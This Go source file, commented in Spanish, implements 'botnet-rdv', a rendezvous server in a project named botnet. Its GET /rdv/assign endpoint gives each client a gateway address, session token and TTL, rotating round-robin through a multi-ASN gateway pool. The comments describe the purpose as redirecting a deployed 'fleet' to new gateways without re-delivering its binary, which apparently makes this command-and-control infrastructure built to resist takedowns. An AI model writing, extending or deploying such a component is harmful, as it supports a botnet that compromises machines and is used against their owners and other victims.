// botnet-rdv — rendezvous sin estado: GET /rdv/assign (BLUEPRINT §5,
// injerto P1, T-0402). Responde {gateway_addr, session_token, ttl_s} —
// exactas 3 claves — y reparte los gateways del pool con round-robin:
// rotar el destino de la flota es cambiar el backend del rdv (Redis/DNS),
// nunca reentregar el binario de 4 MB. Sin estado por request: reiniciar
// la instancia entre calls no cuesta ni un handshake (AC2).
//
// --version y --config son los unicos flags comprometidos por el
// esqueleto; el resto despliega la logica de la epica.
package main

import (
	"flag"
	"fmt"
	"log/slog"
	"net/http"
	"os"
	"strings"
	"sync/atomic"

	"github.com/botnet/botnet/internal/config"
	"github.com/botnet/botnet/internal/logx"
	"github.com/botnet/botnet/pkg/logger"
)

// version se pisa en build con -ldflags "-X main.version=...".
var version = "0.1.0-dev"

const name = "botnet-rdv"

// defaultGateways son los destinos de ejemplo (documentacion) cuando la
// config no trae pool: el par de ASNs de la fixture A1-18.
const defaultGateways = "gw-a.botnet.example:443,gw-b.botnet.example:443"

const defaultTTL = 900

// Assigner reparte el pool de gateways. Prohibido el estado por nodo: el
// unico contador es el round-robin del proceso (en produccion el indice
// vive en Redis y por eso 2 instancias alternadas se ven como un
// repartidor coherente sin sincronizarse).
type Assigner struct {
	Gateways []string
	TTLS     int
	idx      atomic.Uint32
}

// NewAssigner valida un pool no vacio; ttl<=0 cae al default.
func NewAssigner(gateways []string, ttl int) *Assigner {
	pool := make([]string, 0, len(gateways))
	for _, g := range gateways {
		if g = strings.TrimSpace(g); g != "" {
			pool = append(pool, g)
		}
	}
	if ttl <= 0 {
		ttl = defaultTTL
	}
	return &Assigner{Gateways: pool, TTLS: ttl}
}

// Next es el round-robin: consecutive calls devuelven destinos
// consecutive del pool (con >= 2 gateways, nunca el mismo dos veces).
func (a *Assigner) Next() string {
	i := a.idx.Add(1) - 1
	return a.Gateways[i%uint32(len(a.Gateways))]
}

// newAssignHandler construye el mux: solo GET /rdv/assign (y /healthz
// para el probe del orquestador). El JSON se escribe a mano para
// garantizar las 3 claves exactas y el orden estable.
func newAssignHandler(a *Assigner, geo *GatewayGeo, log *slog.Logger) http.Handler {
	mux := http.NewServeMux()
	mux.HandleFunc("/rdv/assign", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodGet {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		gw := a.Next()
		token := newSessionToken()
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"gateway_addr":%q,"session_token":%q,"ttl_s":%d}`, gw, token, a.TTLS)
		if log != nil {
			log.Info("rdv/assign", "gateway", gw, "asn", geo.ASN(gw), "client", r.RemoteAddr)
		}
	})
	mux.HandleFunc("/healthz", func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte("ok\n"))
	})
	return mux
}

func main() {
	var (
		showVer     bool
		cfgPath     string
		addr        string
		gwCSV       string
		ttl         int
		asnTable    string
		metricsAddr string
	)
	flag.StringVar(&cfgPath, "config", "", "path to JSON config file")
	flag.BoolVar(&showVer, "version", false, "print version and exit")
	flag.StringVar(&addr, "addr", ":8081", "listen address")
	flag.StringVar(&gwCSV, "gateways", defaultGateways, "comma-separated gateway pool (host:port)")
	flag.IntVar(&ttl, "ttl", defaultTTL, "ttl_s of the assignment")
	flag.StringVar(&asnTable, "asn-table", "", "optional ASN table fixture (prefix asn lines)")
	flag.StringVar(&metricsAddr, "metrics-addr", "", "servir /metrics aqui (vacio = off)")
	flag.Parse()

	if showVer {
		fmt.Printf("%s %s\n", name, version)
		return
	}
	if _, err := config.Load(cfgPath); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	log := logx.New("info")

	pool := strings.Split(gwCSV, ",")
	if len(NewAssigner(pool, ttl).Gateways) < 2 {
		// condicion A1-18: sin >= 2 destinos no hay rotacion que valga.
		log.Warn("rdv: pool de gateways < 2 — la condicion multi-ASN queda en una pata")
	}
	a := NewAssigner(pool, ttl)
	geo, err := LoadGatewayGeo(asnTable)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	if metricsAddr != "" {
		m := logger.NewMetrics(name)
		go func() {
			if err := http.ListenAndServe(metricsAddr, m.Handler()); err != nil {
				log.Error("rdv: /metrics cae", "err", err)
			}
		}()
	}
	handler := newAssignHandler(a, geo, log)
	log.Info(name+" listening", "addr", addr, "gateways", len(a.Gateways), "asns", geo.DistinctASNs(a.Gateways))
	if err := http.ListenAndServe(addr, handler); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
}
